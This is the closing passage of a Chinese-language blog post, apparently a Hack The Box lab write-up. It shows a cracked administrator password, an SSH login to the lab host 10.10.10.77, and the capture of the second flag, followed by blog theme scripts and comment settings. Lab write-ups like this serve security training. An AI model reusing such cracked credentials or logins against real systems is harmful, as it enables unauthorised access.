+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.39.13.png" alt="截屏2021-11-09 上午3.39.13"><br>成功找到密码<code>Cr4ckMeIfYouC4n!</code>并通过该密码登录管理员</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh administrator@10.10.10.77</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.44.25.png" alt="截屏2021-11-09 上午3.44.25"><br>成功拿到第二个flag</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/f37c1a05/">HTB: Dropzone<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
